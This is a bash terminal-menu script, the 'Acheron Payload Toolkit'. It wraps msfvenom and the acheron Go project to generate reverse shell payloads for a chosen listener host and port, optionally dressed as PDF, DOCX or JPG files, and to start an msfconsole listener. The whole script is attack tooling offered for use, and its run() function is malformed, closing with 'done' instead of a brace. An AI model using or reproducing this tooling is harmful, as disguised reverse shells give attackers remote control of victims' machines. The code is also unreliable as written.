#!/bin/bash
# Acheron Payload Toolkit - Main TUI
# Portable, no hardcoded paths

# Verbose ON by default, --quiet/-q to disable
VERBOSE=true
# Parse --quiet / -q to disable verbose
ARGS=()
for arg in "$@"; do
    if [ "$arg" = "--quiet" ] || [ "$arg" = "-q" ]; then
        VERBOSE=false
    else
        ARGS+=("$arg")
    fi
done
set -- "${ARGS[@]}"

# Use environment variable for toolkit directory
TOOLKIT_DIR="${ACHERON_TOOLKIT_DIR:-$HOME/.local/share/acheron-toolkit}"

log() { [ "$VERBOSE" = true ] && echo -e "\e[1;36m[VERBOSE]\e[0m $*"; }
info() { echo -e "\e[1;32m[+]\e[0m $*"; }
err() { echo -e "\e[1;31m[-]\e[0m $*"; }

run() {
    if [ "$VERBOSE" = true ]; then
        log "Running: $*"
        "$@" 2>&1
    else
        "$@" 2>&1
    fi
done

check_deps() {
    local ok=true
    command -v msfvenom >/dev/null 2>&1 || { err "msfvenom missing (sudo apt install metasploit-framework)"; ok=false; }
    command -v go >/dev/null 2>&1 || { err "go missing (sudo apt install golang-go)"; ok=false; }
    command -v msfconsole >/dev/null 2>&1 || { err "msfconsole missing (sudo apt install metasploit-framework)"; ok=false; }
    [ "$ok" = true ] && info "Dependencies OK" || return 1
}

clear
while true; do
    clear
    echo -e "\e[1;34m╔══════════════════════════════════════════════════╦\e[0m"
    echo -e "\e[1;34m║        \e[1;37mAcheron Payload Toolkit v1.0\e[1;34m         ║\e[0m"
    echo -e "\e[1;34m╠══════════════════════════════════════════════════╣\e[0m"
    echo -e "\e[1;34m║  \e[1;32m1\e[0m) Generate Reverse Shell (Acheron)      ║\e[0m"
    echo -e "\e[1;34m║  \e[1;32m2\e[0m) Start Listener (msfconsole)            ║\e[0m"
    echo -e "\e[1;34m║  \e[1;32m3\e[0m) Check Dependencies                      ║\e[0m"
    echo -e "\e[1;34m║  \e[1;32m0\e[0m) Exit                                    ║\e[0m"
    echo -e "\e[1;34m╚═══════════════════════════════════════════════════╝\e[0m"
    read -p $'\e[1;33m[?] \e[0mSelect: ' choice
    case $choice in
        1)
            check_deps || { read -p $'\n[Enter]'; continue; }
            read -p $'\e[1;33m[IP]\e[0m LHOST: ' lhost
            read -p $'\e[1;33m[PORT]\e[0m LPORT: ' lport
            echo -e "\e[1;34mTemplate:\e[0m\n 1) None\n 2) PDF\n 3) DOCX\n 4) JPG"
            read -p $'\e[1;33m[?] \e[0mSelect: ' ptemplate
            case $ptemplate in 1) pt="none" ;; 2) pt="pdf" ;; 3) pt="docx" ;; 4) pt="jpg" ;; *) pt="none" ;; esac
            "$ACHERON_TOOLKIT_DIR/acherongen.sh" "$lhost" "$lport" "$pt"
            read -p $'\n[Enter]'
            ;;
        2)
            check_deps || { read -p $'\n[Enter]'; continue; }
            read -p $'\e[1;33m[LHOST]\e[0m LHOST: ' lhost
            read -p $'\e[1;33m[PORT]\e[0m LPORT: ' lport
            listener_file=$("$ACHERON_TOOLKIT_DIR/listener_gen.sh" "$lport" "$lhost")
            echo "[*] Listener generato: $listener_file"
            read -p $'\e[1;33m[?] \e[0mLanciare msfconsole ora? (y/n): ' launch
            if [ "$launch" = "y" ] || [ "$launch" = "Y" ]; then
                msfconsole -r "$listener_file"
            fi
            read -p $'\n[Enter]'
            ;;
        3)
            info "Checking dependencies..."
            command -v msfvenom && echo "  msfvenom: OK" || echo "  msfvenom: MISSING"
            command -v go && echo "  go: OK" || echo "  go: MISSING"
            command -v msfconsole && echo "  msfconsole: OK" || echo "  msfconsole: MISSING"
            go list -m github.com/f1zm0/acheron 2>/dev/null && echo "  acheron: OK" || echo "  acheron: will download"
            read -p $'\n[Enter]'
            ;;
        0) exit 0 ;;
        *) sleep 1 ;;
    esac
done